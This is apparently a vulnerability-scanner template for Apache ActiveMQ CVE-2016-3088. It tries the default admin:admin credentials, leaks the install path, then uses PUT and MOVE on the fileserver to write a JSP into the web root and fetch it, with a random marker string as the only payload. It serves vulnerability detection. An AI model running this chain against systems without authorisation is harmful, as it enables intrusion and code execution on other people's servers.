name: poc-yaml-activemq-cve-2016-3088
set:
  r1: randomLowercase(16)
groups:
  yespwd:
  #  存在默认密码
  - method: GET
    path: /admin/test/systemProperties.jsp
    headers:
      Authorization: Basic YWRtaW46YWRtaW4=
    follow_redirects: false
    search: |
       <td class="label">activemq.home</td>\n  <td>(?P<path>.+?)</td>
    expression: |
      response.status == 200 && response.body.bcontains(b'activemq.base')
  - method: PUT
    path: /fileserver/{{r1}}.txt
    body: |
       {{r1}}
    follow_redirects: false
    expression: |
      response.status == 204
  - method: MOVE
    path: /fileserver/{{r1}}.txt
    headers:
      Destination: file://{{path}}/webapps/api/{{r1}}.jsp
    follow_redirects: false
    expression: |
      response.status == 204
  - method: GET
    path: /api/{{r1}}.jsp
    headers:
      Authorization: Basic YWRtaW46YWRtaW4=
    follow_redirects: false
    expression: |
      response.status == 200 &&  response.body.bcontains(bytes(r1))
  nopwd:
  #  无密码
  - method: PUT
    path: /fileserver/{{r1}}.txt
    body: |
       {{r1}}
    follow_redirects: false
    expression: |
      response.status == 204
  - method: GET
    path: /fileserver/{{r1}}.txt
    follow_redirects: false
    expression: |
      response.status == 200 &&  response.body.bcontains(bytes(r1))
detail:
  CVE: Apache ActiveMQ 远程代码执行漏洞 (CVE-2016-3088)
  Author: Sup3rm4nx0x (https://github.com/Sup3rm4nx0x)
  links:
  - https://blog.csdn.net/cj_Allen/article/details/106898020
